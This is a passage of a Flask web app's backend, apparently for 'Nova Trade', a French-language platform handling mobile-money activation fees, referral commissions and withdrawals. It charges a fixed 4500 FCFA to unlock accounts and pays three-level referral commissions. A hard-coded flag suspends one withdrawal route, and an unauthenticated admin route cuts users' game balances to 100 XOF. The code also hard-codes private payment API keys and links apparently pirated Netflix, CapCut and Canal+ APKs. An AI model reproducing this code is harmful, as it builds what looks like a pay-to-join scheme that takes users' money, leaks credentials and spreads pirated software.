    # Burkina Faso
    "Burkina Faso": "BF",

    # B├®nin
    "B├®nin": "BJ",
    "Benin": "BJ",

    # Togo
    "Togo": "TG",

    # Congo DRC
    "Congo DRC": "COD",
    "RDC": "COD",
    "R├®publique D├®mocratique du Congo": "COD",

    # Congo Brazzaville
    "Congo": "COG",
    "Congo Brazzaville": "COG",

    # Gabon
    "Gabon": "GAB",

    # Uganda
    "Uganda": "UGA",
}


def get_soleaspay_services():
    return SOLEASPAY_SERVICES_JSON

@app.route("/dashboard_bloque", methods=["GET", "POST"])
def dashboard_bloque():
    user = get_logged_in_user()

    if user_is_activated(user):
        return redirect(url_for("dashboard_page"))

    # Simule un d├®p├┤t pending
    pending_depot = None
    user_has_pending_depot = bool(pending_depot)

    # R├®cup├®ration du code pays
    country_code = COUNTRY_CODE.get(user.country.strip())
    if not country_code:
        flash("Pays non support├®.", "danger")
        return redirect(url_for("connexion_page"))

    # =========================
    # POST : paiement
    # =========================
    if request.method == "POST":
        operator_name = request.form.get("operator")
        amount = request.form.get("montant", type=int)
        fullname = request.form.get("fullname")
        phone = request.form.get("phone")  # Ô£à num├®ro modifiable

        # ­ƒöÆ V├®rifications
        if not operator_name or not amount or not fullname or not phone:
            flash("Tous les champs sont requis.", "danger")
            return redirect(url_for("dashboard_bloque"))

        if amount != 4500:
            flash("Le montant d'activation est exactement 4500 FCFA.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # ­ƒöÆ Nettoyage num├®ro
        phone = phone.replace(" ", "").replace("-", "")

        if not phone.isdigit() or len(phone) < 8:
            flash("Num├®ro de paiement invalide.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # ­ƒö╣ Recherche du service SoleasPay
        service = next(
            (s for s in SERVICES[country_code] if s["name"] == operator_name),
            None
        )

        if not service:
            flash("Op├®rateur non support├® pour votre pays.", "danger")
            return redirect(url_for("dashboard_bloque"))

        # ­ƒö╣ Cr├®ation du d├®p├┤t AVANT paiement avec toutes les infos obligatoires
        new_depot = Depot(
            user_name=user.username,
            phone=phone,
            operator=operator_name,  # Ô£à maintenant obligatoire
            country=country_code,    # Ô£à maintenant obligatoire
            montant=amount,
            statut="en_attente",
            email=user.email
        )
        db.session.add(new_depot)
        db.session.commit()

        # ­ƒö╣ Payload SoleasPay avec DEPOT_ID
        payload = {
            "wallet": phone,  # Ô£à NUM├ëRO SAISI PAR LÔÇÖUTILISATEUR
            "amount": amount,
            "currency": "XOF",
            "order_id": f"NOVA-{new_depot.id}",
            "description": f"Activation Nova {user.username} DEPOT_ID={new_depot.id}",
            "payer": fullname,
            "payerEmail": user.email,
            "successUrl": "https://nova-trade.cc/dashboard/pay/ok",
            "failureUrl": "https://nova-trade.cc/dashboard_bloque",
        }

        headers = {
            "x-api-key": SOLEAS_API_KEY,
            "operation": "2",
            "service": str(service["id"]),
            "Content-Type": "application/json"
        }

        try:
            response = requests.post(
                "https://soleaspay.com/api/agent/bills/v3",
                headers=headers,
                json=payload,
                timeout=30
            )
            result = response.json()
        except Exception as e:
            flash(f"Erreur de connexion au serveur de paiement : {e}", "danger")
            return redirect(url_for("dashboard_bloque"))

        if not result.get("succ├¿s"):
            flash(result.get("message", "Erreur paiement"), "danger")
            return redirect(url_for("dashboard_bloque"))

        flash("Veuillez confirmer le paiement sur votre t├®l├®phone.", "info")
        return redirect(url_for("dashboard_bloque"))

    # =========================
    # GET : affichage page
    # =========================
    return render_template(
        "dashboard_bloque.html",
        user=user,
        user_has_pending_depot=user_has_pending_depot,
        services_by_country=SERVICES,
        country_code=country_code
    )


@app.route("/verify", methods=["GET"])
def verify_payment():
    order_id = request.args.get("orderId")
    pay_id = request.args.get("payId")
    headers = {
        "x-api-key": API_KEY
    }
    url = f"https://soleaspay.com/api/agent/verif-pay?orderId={order_id}&payId={pay_id}"
    response = requests.get(url, headers=headers)
    return jsonify(response.json())



@app.route("/logout")
def logout_page():
    session.clear()
    flash("D├®connexion effectu├®e.", "info")
    return redirect(url_for("connexion_page"))


def get_global_stats():
    total_users = db.session.query(func.count(User.id)).scalar() or 0
    total_deposits = db.session.query(func.sum(Depot.montant)).filter(Depot.statut=="valide").scalar() or 0
    total_withdrawn = db.session.query(func.sum(User.total_retrait)).scalar() or 0  # ÔåÉ On utilise maintenant total_retrait
    return total_users, total_deposits, total_withdrawn


# --------------------------------------
# 1´©ÅÔâú Page dashboard_bloque (initiation paiement)
# --------------------------------------
from urllib.parse import urlencode

@app.route("/api/webhook/soleaspay", methods=["POST"])
def webhook_soleaspay():

    print("=" * 50)
    print("WEBHOOK RECU")
    print("HEADERS:", dict(request.headers))
    print("JSON:", request.get_json())
    print("=" * 50)

    received_key = request.headers.get("x-private-key")

    if received_key != SOLEAS_WEBHOOK_SECRET:
        return jsonify({"error": "Unauthorized"}), 403

    data = request.get_json()

    details = data.get("data", {})
    external_reference = details.get("external_reference")

    if not external_reference.startswith("NOVA-"):
        return jsonify({"ignored": True})

    depot_id = int(external_reference.replace("NOVA-", ""))

    depot = db.session.get(Depot, depot_id)

    if not depot:
        return jsonify({"error": "Depot not found"}), 404

    if depot.statut == "valide":
        return jsonify({"received": True})

    success = data.get("success")
    status = data.get("status")

    if success and status == "SUCCESS":

        amount = int(float(details.get("amount", 0)))

        if int(depot.montant) != amount:
            return jsonify({"error": "Wrong amount"}), 400

        user = User.query.filter_by(username=depot.user_name).first()

        depot.statut = "valide"
        depot.reference = details.get("reference")

        user.solde_depot += depot.montant
        user.solde_total += depot.montant

        if not user.premier_depot:
            user.premier_depot = True
            if user.parrain:
                donner_commission(user.parrain, depot.montant)

        db.session.commit()

    elif success is False:

        depot.statut = "echoue"
        db.session.commit()

    return jsonify({"received": True})


@app.route("/paiement/soleaspay/retour")
def bkapay_retour():
    status = request.args.get("status")

    # ­ƒöÉ R├®cup├®ration de l'utilisateur connect├®
    user = get_logged_in_user()  # Assure-toi que cette fonction retourne l'utilisateur connect├®

    if status == "success":
        flash("Paiement re├ºu ! Votre compte sera activ├® automatiquement.", "success")


        db.session.commit()
        return redirect(url_for("dashboard_pay_ok"))

    # Paiement ├®chou├® ou annul├®
    flash("Paiement ├®chou├® ou annul├®.", "danger")
    return redirect(url_for("dashboard_bloque"))

@app.route("/dashboard/pay/ok", methods=["GET"])
def dashboard_pay_ok():
    user_id = session.get("user_id")
    if not user_id:
        flash("Vous devez vous connecter pour acc├®der au dashboard.", "danger")
        return redirect(url_for("connexion_page"))

    user = db.session.get(User, user_id)
    if not user:
        session.clear()
        flash("Session invalide, veuillez vous reconnecter.", "danger")
        return redirect(url_for("connexion_page"))

    # Ô£à MARQUER D├ëFINITIVEMENT L'ACC├êS PAY OK
    if not user.has_seen_pay_ok:
        user.has_seen_pay_ok = True
        db.session.commit()

    # ­ƒöù Lien de parrainage
    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    # ­ƒôè Stats globales
    total_users, total_deposits, total_withdrawn = get_global_stats()
    revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)

    return render_template(
        "dashboard.html",
        user=user,
        points=user.points or 0,
        revenu_cumule=revenu_cumule,
        solde_parrainage=user.solde_parrainage or 0,
        solde_revenu=user.solde_revenu or 0,
        total_users=total_users,
        total_deposits=total_deposits,
        total_withdrawn=total_withdrawn,
        total_withdrawn_user=getattr(user, "total_retrait", 0),
        referral_code=referral_code,
        referral_link=referral_link
    )



@app.route("/api/check-activation")
def api_check_activation():
    user = get_logged_in_user()
    return {
        "activated": user_is_activated(user)
    }

@app.route("/chaine")
def whatsapp_channel():
    return render_template("chaine.html")

from datetime import datetime, timedelta

# Assure-toi que ces constantes sont d├®finies en haut de ton app.py
MAX_GAIN = 500.0
CYCLE_DAYS = 3
WINDOW_HOURS = 24

@app.route("/dashboard")
def dashboard_page():
    user_id = session.get("user_id")
    if not user_id:
        flash("Vous devez vous connecter.", "danger")
        return redirect(url_for("connexion_page"))

    user = db.session.get(User, user_id)
    if not user:
        session.clear()
        return redirect(url_for("connexion_page"))

    # --- LOGIQUE DE PARRAINAGE ET STATS ---
    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    if not user_is_activated(user) and not user.has_seen_pay_ok:
        return redirect(url_for("dashboard_bloque"))

    total_users, total_deposits, total_withdrawn = get_global_stats()
    revenu_cumule = (user.solde_parrainage or 0) + (user.solde_revenu or 0)

    # --- NOUVELLE LOGIQUE DE JEU (STRICTE) ---
    now = datetime.now()
    total_bonus = user.bonus or 0.0
    is_blocked_500 = total_bonus >= MAX_GAIN
    no_rounds_left = (user.remaining_rounds or 0) <= 0
    
    can_play = False
    next_date = None
    
    # Date de r├®f├®rence pour le cycle
    base_date = user.last_play_date or user.date_creation

    if base_date and not is_blocked_500 and not no_rounds_left:
        next_date = base_date + timedelta(days=CYCLE_DAYS)
        deadline_date = next_date + timedelta(hours=WINDOW_HOURS)

        if now < next_date:
            can_play = False
        elif next_date <= now <= deadline_date:
            can_play = True
        elif now > deadline_date:
            # Fen├¬tre rat├®e : On applique la p├®nalit├® imm├®diatement
            user.remaining_rounds -= 1
            user.last_play_date = next_date 
            db.session.commit()
            return redirect(url_for("dashboard_page"))

    # Cas sp├®cial : Premier jeu apr├¿s inscription
    if not user.last_play_date and not no_rounds_left and not is_blocked_500:
        can_play = True

    return render_template(
        "dashboard.html",
        user=user,
        points=user.points or 0,
        revenu_cumule=revenu_cumule,
        solde_parrainage=user.solde_parrainage or 0,
        solde_revenu=user.solde_revenu or 0,
        total_users=total_users,
        total_withdrawn_user=user.total_retrait or 0,
        total_deposits=total_deposits,
        referral_code=referral_code,
        referral_link=referral_link,
        total_withdrawn=total_withdrawn,

        # --- VARIABLES JEU ---
        can_play=can_play,
        next_date=next_date,
        rounds_left=user.remaining_rounds or 0,
        is_blocked_500=(is_blocked_500 or no_rounds_left)
    )

def user_is_activated(user):

    if not user:
        return False

    if user.premier_depot:
        return True

    return Depot.query.filter(
        (Depot.user_id == user.id) |
        (Depot.user_name == user.username),
        Depot.statut == "valide"
    ).first() is not None

# ===== D├®corateur admin =====
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or not getattr(current_user, "is_admin", False):
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route("/admin/users")
def admin_users():
    user = get_logged_in_admin()

    if not user:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("admin_finance"))

    users = User.query.order_by(User.date_creation.desc()).all()

    user_data = []
    for u in users:
        niveau1 = u.downlines.count()
        niveau2 = sum([child.downlines.count() for child in u.downlines])
        niveau3 = sum([sum([c.downlines.count() for c in child.downlines]) for child in u.downlines])

        user_data.append({
            "username": u.username,
            "email": u.email,
            "phone": u.phone,
            "parrain": u.parrain if u.parrain else "ÔÇö",
            "niveau1": niveau1,
            "niveau2": niveau2,
            "niveau3": niveau3,
            "date_creation": u.date_creation,
            "premier_depot": u.premier_depot
        })

    return render_template("admin_users.html", user=user, users=user_data)

@app.route("/admin/users/inactifs")
def admin_users_inactifs():
    user = get_logged_in_admin()

    if not user:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("admin_finance"))

    inactifs = User.query.filter_by(premier_depot=False).order_by(User.date_creation.desc()).all()

    return render_template(
        "admin_users_inactifs.html",
        user=user,
        inactifs=inactifs,
        total_inactifs=len(inactifs)
    )

@app.route("/admin/users/actifs")
def admin_users_actifs():
    user = get_logged_in_admin()

    if not user:
        flash("Acc├¿s refus├®.", "danger")
        return redirect(url_for("admin_finance"))

    actifs = User.query.filter_by(premier_depot=True).order_by(User.date_creation.desc()).all()

    return render_template(
        "admin_users_actifs.html",
        user=user,
        actifs=actifs,
        total_actifs=len(actifs)
    )

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        # V├®rifie l'utilisateur admin
        user = User.query.filter_by(username=username, is_admin=True).first()
        if user and check_password_hash(user.password, password):
            session["admin_id"] = user.id
            return redirect(url_for("admin_canal_edit"))
        else:
            flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
            return redirect(url_for("admin_login"))
    return render_template("admin_login.html")

@app.route("/admin/parrainage", methods=["GET", "POST"])
def admin_parrainage():
    if "admin_id" not in session:
        return redirect(url_for("admin_login"))

    users = User.query.order_by(User.username.asc()).all()

    if request.method == "POST":
        user_id = request.form.get("user_id")
        nouveau_username = (request.form.get("username") or "").strip().lower()
        nouveau_parrain = (request.form.get("parrain") or "").strip().lower()
        nouveau_phone = (request.form.get("phone") or "").strip()

        user = User.query.get(user_id)

        if not user:
            flash("Utilisateur introuvable.", "danger")
            return redirect(url_for("admin_parrainage"))

        # Ô£à Modifier USERNAME
        if nouveau_username and nouveau_username != user.username:

            # V├®rification format (lettres minuscules + chiffres seulement)
            if not nouveau_username.isalnum() or not nouveau_username.islower():
                flash("Le username doit contenir uniquement lettres minuscules et chiffres.", "danger")
                return redirect(url_for("admin_parrainage"))

            # V├®rification unicit├®
            username_existe = User.query.filter(
                User.username == nouveau_username,
                User.id != user.id
            ).first()

            if username_existe:
                flash("Ce username est d├®j├á utilis├®.", "danger")
                return redirect(url_for("admin_parrainage"))

            ancien_username = user.username
            user.username = nouveau_username

            # ­ƒöÑ Mettre ├á jour tous ceux qui ont cet ancien username comme parrain
            filleuls = User.query.filter_by(parrain=ancien_username).all()
            for f in filleuls:
                f.parrain = nouveau_username

        # Ô£à Modifier PHONE
        if nouveau_phone and nouveau_phone != user.phone:
            phone_existe = User.query.filter(
                User.phone == nouveau_phone,
                User.id != user.id
            ).first()

            if phone_existe:
                flash("Num├®ro d├®j├á utilis├®.", "danger")
                return redirect(url_for("admin_parrainage"))

            user.phone = nouveau_phone

        # Ô£à Modifier PARRAIN
        if nouveau_parrain == "":
            user.parrain = None
        else:
            parrain_user = User.query.filter_by(username=nouveau_parrain).first()
            if not parrain_user:
                flash("Parrain invalide.", "danger")
                return redirect(url_for("admin_parrainage"))

            if nouveau_parrain == user.username:
                flash("Un utilisateur ne peut pas ├¬tre son propre parrain.", "danger")
                return redirect(url_for("admin_parrainage"))

            user.parrain = nouveau_parrain

        db.session.commit()
        flash(f"Ô£à Mise ├á jour effectu├®e pour {user.username}.", "success")
        return redirect(url_for("admin_parrainage"))

    return render_template("admin_parrainage.html", users=users)

# ===== Helpers =====
def get_logged_in_user_phone():
    return session.get("phone")

from flask import send_from_directory

@app.route('/download/contact')
def download_contact():
    return send_from_directory('static/files', 'con.vcf', as_attachment=True)

from flask import Flask, render_template


# Route pour la page About
@app.route("/about")
def about():
    return render_template("about.html")

def get_service_name(service_id):
    """
    Cherche le nom du service dans tous les pays pour un ID donn├®.
    """
    for country_services in SERVICES.values():
        for s in country_services:
            if s["id"] == service_id:
                return s["name"]
    return f"Service {service_id}"  # fallback si ID inconnu

@app.route("/mes-retraits")
def mes_retraits():
    user = get_logged_in_user()

    # CORRECTION : Filtrer par user_id au lieu du num├®ro de t├®l├®phone
    retraits = Retrait.query.filter_by(user_id=user.id).order_by(Retrait.date.desc()).all()

    # Ajouter le nom lisible pour chaque retrait
    for r in retraits:
        # On s'assure que service_name est bien d├®fini pour le template
        r.service_name = get_service_name(r.payment_method)

    return render_template("mes_retraits.html", retraits=retraits, user=user)


from datetime import datetime

from datetime import date

@app.route("/taches/click-jeudi", methods=["GET", "POST"])
def click_jeudi():
    user = get_logged_in_user()

    # V├®rifier si c'est jeudi
    if date.today().weekday() != 3:  # 0 = lundi, 3 = jeudi
        return render_template("pas_jeudi.html", user=user)

    # V├®rifier si l'utilisateur a d├®j├á fait le click cette semaine
    debut_semaine = date.today() - timedelta(days=date.today().weekday())  # lundi de cette semaine
    deja_fait = ClickJeudiReponse.query.filter(
        ClickJeudiReponse.user_id == user.id,
        ClickJeudiReponse.date >= debut_semaine
    ).first()

    if deja_fait:
        return render_template("deja_click.html", user=user)

    if request.method == "POST":
        points = 20
        user.points = user.points or 0  # corrige le None
        user.points += points
        db.session.commit()

        # Enregistrer la tentative
        click_reponse = ClickJeudiReponse(user_id=user.id, points=points, date=date.today())
        db.session.add(click_reponse)
        db.session.commit()

        return render_template("resultat_click.html", points=points, user=user)

    return render_template("click_jeudi.html", user=user)


@app.route("/whatsapp-number", methods=["POST"])
def whatsapp_number():
    user = User.query.get(session["user_id"])

    number = request.form.get("number").strip()

    if not number.startswith("+") or not number[1:].isdigit() or len(number) < 10:
        flash("Num├®ro invalide !", "error")
        return redirect("/dashboard")

    user.whatsapp_number = number
    db.session.commit()

    vcf_path = os.path.join("static", "files", "con.vcf")

    try:
        with open(vcf_path, "a", encoding="utf-8") as file:
            file.write(
                f"BEGIN:VCARD\n"
                f"VERSION:3.0\n"
                f"N:{user.username}\n"
                f"TEL:{number}\n"
                f"END:VCARD\n\n"
            )
    except Exception as e:
        print("Erreur VCF :", e)

    return redirect("/dashboard")

@app.route("/netflix-view")
def netflix_view_page():
    return render_template("netflix.html")


@app.route("/apk")
def apk_page():
    """
    Retourne la liste des APK disponibles via liens Google Drive.
    """
    apk_files = [
        {
            "name": "Netflix",
            "filename": "Netflix.apk",
            "link": "https://drive.google.com/file/d/1afSa24_oVoTWRCgpO07Lbu4qjKMUhwLC/view?usp=drivesdk"
        },
        {
            "name": "Chat",
            "filename": "chat.apk",
            "link": "https://drive.google.com/file/d/1-4idwrgNxjNilpLzR8zHkdMroVo41g9b/view?usp=drivesdk"
        },
        {
            "name": "CapCut",
            "filename": "capcut.apk",
            "link": "https://drive.google.com/file/d/1hwEzqwQWV2FKnTg1u0QAWrPjjOEyZCyj/view?usp=drivesdk"
        }
    ]

    return render_template("apk.html", apk_files=apk_files)

@app.route("/apk-canal")
def apk_canal_page():
    # Lien de ton application
    canal_apk = {
        "name": "Canal+ Premium",
        "filename": "canal_plus_vavoo.apk",
        "link": "https://drive.google.com/uc?id=15G5lmyNMw2xYTm_XvvhIX77uBqT99lLq", # Lien direct vers le t├®l├®chargement
        "reference": "Vavoo.to"
    }
    return render_template("apk_canal.html", app=canal_apk)


@app.route("/ecom")
def ecom():
    return render_template("ecom.html")

@app.route("/nous")
def nous_page():
    return render_template("nous.html")

@app.route("/trade")
def trade():
    return render_template("trade.html")

from flask import send_from_directory

@app.route("/sitemap.xml")
def sitemap():
    return send_from_directory(".", "sitemap.xml")

from flask import request, redirect, url_for, flash
import os
from werkzeug.utils import secure_filename
from datetime import datetime



PUBLIC_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
PRIVATE_SECRET_KEY = "SP_bS4Kwii-Txs1aMunv8D9wpEbdpEVgfpvDvKn-OrWt6Y"

from datetime import datetime

@app.route("/retrait", methods=["GET", "POST"])
def retrait_page():
    user = get_logged_in_user()

    if not user:
        flash("Veuillez vous connecter.", "danger")
        return redirect(url_for("login"))

    MIN_RETRAIT = 5000
    MAX_RETRAIT = 50000
    FRAIS = 500

    # On s'assure que c'est bien un float
    solde_actuel = float(user.solde_parrainage or 0)
    stats = {"commissions_total": solde_actuel}

    country_code = COUNTRY_CODE.get(user.country)
    services = SERVICES.get(country_code, [])

    if request.method == "POST":
        try:
            montant = float(request.form.get("montant", 0))
            service_id = int(request.form.get("payment_method", 0))
        except (ValueError, TypeError):
            flash("Donn├®es de formulaire invalides.", "danger")
            return redirect(url_for("retrait_page"))

        wallet = request.form.get("phone", "").strip()
        pin = request.form.get("pin", "").strip()

        # ==========================
        # VALIDATIONS
        # ==========================
        if montant < MIN_RETRAIT or montant > MAX_RETRAIT:
            flash(f"Le montant doit ├¬tre entre {MIN_RETRAIT} et {MAX_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_page"))

        montant_total = montant + FRAIS

        if montant_total > solde_actuel:
            flash("Solde insuffisant pour couvrir le montant et les frais (500 XOF).", "danger")
            return redirect(url_for("retrait_page"))

        service = next((s for s in services if s["id"] == service_id), None)
        if not service:
            flash("Service de paiement invalide.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # ­ƒöÉ PIN CHECK
        # ==========================
        if not user.pin_code:
            flash("Veuillez d├®finir votre code PIN dans votre profil.", "danger")
            return redirect(url_for("profile_page"))

        # On utilise check_password_hash pour comparer le PIN hach├®
        if not check_password_hash(user.pin_code, pin):
            flash("Code PIN incorrect.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # API RETRAIT
        # ==========================
        response = envoyer_retrait_soleaspay(service_id, wallet, montant)

        if not response or response.get("success") != True:
            # On affiche le message d'erreur de l'API s'il existe
            error_msg = response.get('message', 'Erreur API paiement.') if response else 'Erreur de connexion API.'
            flash(error_msg, "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # SAVE DB (S├®curis├®)
        # ==========================
        try:
            nouveau_retrait = Retrait(
                user_id=user.id,
                montant=montant,
                frais=FRAIS,
                payment_method=service["name"],
                statut="successful",
                phone=wallet,
                pays=user.country,
                date=datetime.utcnow() # Utilisation de datetime.utcnow()
            )

            db.session.add(nouveau_retrait)

            # Mise ├á jour des soldes
            user.solde_parrainage = float(user.solde_parrainage) - montant_total
            user.total_retrait = (float(user.total_retrait or 0)) + montant

            db.session.commit()
            flash("Retrait effectu├® avec succ├¿s Ô£à", "success")
            return redirect(url_for("mes_retraits"))

        except Exception as e:
            db.session.rollback()
            print(f"ÔØî ERREUR STOCKAGE : {str(e)}")
            flash("Erreur lors de l'enregistrement du retrait.", "danger")
            return redirect(url_for("retrait_page"))

    return render_template("retrait.html", user=user, stats=stats, services=services)

@app.route("/retrait-casino", methods=["GET", "POST"])
def retrait_casino_page():
    user = get_logged_in_user()
    if not user:
        return redirect(url_for('login'))

    MIN_RETRAIT = 500
    # On s'assure que bonus_total est trait├® comme un nombre
    bonus_total = float(user.bonus or 0)

    # R├®cup├®rer les services de paiement du pays de l'utilisateur
    country_code = COUNTRY_CODE.get(user.country)
    services = SERVICES.get(country_code, [])

    if request.method == "POST":
        montant = float(request.form.get("montant", 0))
        service_id = int(request.form.get("payment_method", 0))
        wallet = request.form.get("wallet", "").strip()

        # 1. VALIDATIONS DE BASE
        if not wallet or len(wallet) < 8:
            flash("Num├®ro de t├®l├®phone invalide.", "danger")
            return redirect(url_for("retrait_casino_page"))

        if montant < MIN_RETRAIT:
            flash(f"Le minimum est de {MIN_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_casino_page"))

        if montant > bonus_total:
            flash("Solde insuffisant.", "danger")
            return redirect(url_for("retrait_casino_page"))

        # 2. APPEL API SOLEASPAY
        # On lance le paiement directement
        response = envoyer_retrait_soleaspay(service_id, wallet, montant)

        if response and response.get("success") == True:
            # 3. ENREGISTREMENT ET D├ëDUCTION
            try:
                # On d├®duit le solde
                user.bonus -= montant
                
                # On cr├®e la trace du retrait
                nouveau_retrait = Retrait(
                    user_id=user.id,
                    montant=montant,
                    frais=0,
                    payment_method=service_id,
                    statut="successful",
                    phone=wallet,
                    pays=user.country,
                    date=datetime.now()
                )
                
                db.session.add(nouveau_retrait)
                db.session.commit()

                flash(f"Retrait de {montant} XOF envoy├® avec succ├¿s vers {wallet} !", "success")
                return redirect(url_for("dashboard_page"))
                
            except Exception as e:
                db.session.rollback()
                flash("Erreur lors de la mise ├á jour du solde.", "danger")
        else:
            error_msg = response.get('message', '├ëchec de la transaction API') if response else "Service indisponible"
            flash(f"Erreur : {error_msg}", "danger")

    return render_template(
        "retrait_casino.html",
        user=user,
        bonus_total=bonus_total,
        services=services,
        min_retrait=MIN_RETRAIT
    )


@app.route("/admin/reset-soldes-speciaux")
def reset_soldes():
    try:
        # On cible uniquement ceux qui ont plus de 300
        utilisateurs_concernes = User.query.filter(User.solde_jeux > 300).all()
        
        nombre = len(utilisateurs_concernes)
        for u in utilisateurs_concernes:
            u.solde_jeux = 100
        
        db.session.commit()
        return f"Succ├¿s : {nombre} soldes ont ├®t├® r├®initialis├®s ├á 100 XOF."
    except Exception as e:
        db.session.rollback()
        return f"Erreur lors de la mise ├á jour : {str(e)}"

@app.route("/admin/stats-jeux")
def stats_jeux():
    # Tout calcul de base de donn├®es doit ├¬tre ├á l'int├®rieur de la fonction
    
    # 1. On compte les utilisateurs (Plus de 300 XOF)
    nb_joueurs_riches = User.query.filter(User.solde_jeux > 300).count()
    
    # 2. On calcule la somme cumul├®e
    # Note : Assure-toi d'avoir import├® 'func' : from sqlalchemy import func
    somme_totale = db.session.query(func.sum(User.solde_jeux)).filter(User.solde_jeux > 300).scalar() or 0
    
    return f"""
    <div style="font-family: sans-serif; padding: 20px; border-left: 5px solid #5a57e3; background: #f8fafc;">
        <h2 style="color: #5a57e3;">Statistiques Solde Jeux</h2>
        <p><b>Utilisateurs (> 300 XOF) :</b> {nb_joueurs_riches}</p>
        <p><b>Masse mon├®taire cumul├®e :</b> {somme_totale:,.0f} XOF</p>
    </div>
    """


@app.route("/retrait-jeux", methods=["GET", "POST"])
def retrait_jeux_page():
    user = get_logged_in_user()
    
    # --- CONFIGURATION DE SUSPENSION ---
    MAINTENANCE_RETRAIT = True  # Mettre ├á False pour r├®activer
    # ------------------------------------

    MIN_RETRAIT = 4000
    FRAIS = 500
    solde_dispo = float(user.solde_jeux or 0)

    country_code = COUNTRY_CODE.get(user.country)
    services = SERVICES.get(country_code, [])

    if request.method == "POST":
        # S├®curit├® serveur : Bloque le traitement m├¬me si le HTML est modifi├®
        if MAINTENANCE_RETRAIT:
            flash("Action impossible : Les retraits sont actuellement suspendus.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        try:
            montant = float(request.form.get("montant", 0))
            service_id = int(request.form.get("payment_method"))
            numero_retrait = request.form.get("wallet", "").strip()
        except (ValueError, TypeError):
            flash("Donn├®es invalides.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        if not numero_retrait:
            flash("Veuillez saisir un num├®ro de r├®ception.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        if montant < MIN_RETRAIT:
            flash(f"Le montant minimum est de {MIN_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        montant_total = montant + FRAIS

        if montant_total > solde_dispo:
            flash(f"Solde jeux insuffisant. Requis: {montant_total} XOF.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        valid_services = [s["id"] for s in services]
        if service_id not in valid_services:
            flash("Service de paiement invalide.", "danger")
            return redirect(url_for("retrait_jeux_page"))

        # Simulation / Appel API
        response = envoyer_retrait_soleaspay(service_id, numero_retrait, montant)

        if not response or response.get("success") is not True:
            flash(f"Erreur : {response.get('message', '├ëchec de la transaction')}", "danger")
            return redirect(url_for("retrait_jeux_page"))

        # Enregistrement en base de donn├®es
        nouveau_retrait = Retrait(
            user_id=user.id,
            montant=montant,
            frais=FRAIS,
            payment_method=service_id,
            statut="successful",
            phone=numero_retrait,
            pays=user.country,
            date=datetime.utcnow()
        )
        
        user.solde_jeux -= montant_total
        db.session.add(nouveau_retrait)
        db.session.commit()

        flash(f"Retrait de {montant} XOF r├®ussi vers {numero_retrait}.", "success")
        return redirect(url_for("dashboard_page"))

    return render_template(
        "retrait_jeux.html",
        user=user,
        solde_dispo=solde_dispo,
        services=services,
        min_retrait=MIN_RETRAIT,
        frais=FRAIS,
        maintenance=MAINTENANCE_RETRAIT
    )


def get_team_total(user):
    # 1. Niveau 1 : On ne r├®cup├¿re que les usernames pour ├®conomiser la RAM
    niveau1_data = User.query.with_entities(User.username).filter_by(parrain=user.username).all()
    if not niveau1_data:
        return 0

    usernames_n1 = [u.username for u in niveau1_data]
    total = len(usernames_n1)

    # 2. Niveau 2 : On r├®cup├¿re aussi uniquement les usernames
    niveau2_data = User.query.with_entities(User.username).filter(User.parrain.in_(usernames_n1)).all()
    total += len(niveau2_data)

    if niveau2_data:
        # 3. Niveau 3 : Ici ta logique .count() est d├®j├á parfaite
        usernames_n2 = [u.username for u in niveau2_data]
        niveau3_count = User.query.filter(User.parrain.in_(usernames_n2)).count()
        total += niveau3_count

    return total

@app.route("/profile", methods=["GET", "POST"])
def profile_page():
    user = get_logged_in_user()

    if request.method == "POST":
        # ... (Ta logique photo et PIN reste strictement identique)
        if "profile_photo" in request.files:
            file = request.files["profile_photo"]
            if file.filename != "" and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                filename = f"{user.uid}_{filename}"
                filepath = os.path.join(app.config['UPLOAD_FOLDER_PROFILE'], filename)
                file.save(filepath)
                user.profile_image = filename
                db.session.commit()
                flash("Photo mise ├á jour !", "success")

        elif "update_pin" in request.form:
            pin = request.form.get("pin")
            confirm_pin = request.form.get("confirm_pin")
            if not pin or not confirm_pin:
                flash("Champs obligatoires.", "danger")
            elif not pin.isdigit() or len(pin) != 6:
                flash("PIN : 6 chiffres requis.", "danger")
            elif pin != confirm_pin:
                flash("Les PIN ne correspondent pas.", "danger")
            else:
                user.pin_code = generate_password_hash(pin)
                db.session.commit()
                flash("Code PIN mis ├á jour ! ­ƒöÉ", "success")
        return redirect(url_for("profile_page"))

    profile_pic = user.profile_image if user.profile_image else 'default.png'
    team_total = get_team_total(user)

    return render_template(
        "profile.html",
        user=user,
        profile_pic=profile_pic,
        team_total=team_total
    )


@app.route("/revenus")
def revenus_page():
    user = get_logged_in_user()

    total_points = sum([
        user.points_youtube or 0,
        user.points_tiktok or 0,
        user.points_instagram or 0,
        user.points_ads or 0,
        user.points_spin or 0,
        user.points_games or 0,
    ])

    team_total = get_team_total(user)
    total_commission = user.solde_revenu or 0

    return render_template(
        "revenus.html",
        user=user,
        points_youtube=user.points_youtube,
        points_tiktok=user.points_tiktok,
        points_instagram=user.points_instagram,
        points_ads=user.points_ads,
        points_spin=user.points_spin,
        points_games=user.points_games,
        team_total=team_total,
        total_commission=total_commission
    )

@app.route("/points/retrait", methods=["GET", "POST"])
